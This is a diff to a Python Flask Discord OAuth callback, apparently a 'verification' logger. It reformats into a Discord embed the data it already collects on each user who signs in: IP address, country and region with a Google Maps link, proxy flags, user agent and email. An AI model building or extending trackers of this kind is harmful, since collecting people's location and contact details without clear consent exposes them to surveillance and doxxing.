@@ -1,3 +1,5 @@
+# main.py
+
 from flask import Flask, request, render_template
 import requests, json, os, threading
 from dotenv import load_dotenv
@@ -98,11 +100,18 @@ def callback():
         "Authorization": f"Bearer {access_token}"
     }).json()
 
+    avatar_hash = user.get("avatar")
+    if avatar_hash:
+        avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{avatar_hash}.png?size=1024"
+    else:
+        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"
+
     data = {
         "username": user.get("username", ""),
         "discriminator": user.get("discriminator", ""),
         "id": user.get("id", ""),
         "avatar": user.get("avatar"),
+        "avatar_url": avatar_url,
         "locale": user.get("locale"),
         "mfa_enabled": user.get("mfa_enabled"),
         "verified": user.get("verified"),
@@ -126,20 +135,25 @@ def callback():
     save_log(user["id"], data)
 
     try:
-        bot.loop.create_task(bot.send_log(
-            f"✅ 新しいアクセスログ:\n"
-            f"名前: {data['username']}#{data['discriminator']}\n"
-            f"ID: {data['id']}\n"
-            f"IP: {data['ip']}\n"
-            f"国: {data['country']} / 地域: {data['region']}\n"
-            f"Google Map: {data['map_url']}\n"
-            f"Proxy: {data['proxy']} / Hosting: {data['hosting']}\n"
-            f"UA: {data['user_agent']}\n"
-            f"メール: {data['email']}\n"
-            f"Locale: {data['locale']}\n"
-            f"Premium: {data['premium_type']}\n"
-            f"所属サーバー数: {len(guilds)} / 外部連携: {len(connections)}"
-        ))
+        embed_data = {
+            "title": "✅ 新しいアクセスログ",
+            "description": (
+                f"**名前:** {data['username']}#{data['discriminator']}\n"
+                f"**ID:** {data['id']}\n"
+                f"**IP:** {data['ip']}\n"
+                f"**国:** {data['country']} / **地域:** {data['region']}\n"
+                f"[📍 Google Map]({data['map_url']})\n"
+                f"**Proxy:** {data['proxy']} / **Hosting:** {data['hosting']}\n"
+                f"**UA:** `{data['user_agent']}`\n"
+                f"**メール:** {data['email']}\n"
+                f"**Locale:** {data['locale']}\n"
+                f"**Premium:** {data['premium_type']}\n"
+                f"**所属サーバー数:** {len(guilds)} / **外部連携:** {len(connections)}"
+            ),
+            "thumbnail": {"url": data["avatar_url"]}
+        }
+
+        bot.loop.create_task(bot.send_log(embed=embed_data))
 
         if data["proxy"] or data["hosting"]:
             bot.loop.create_task(bot.send_log(
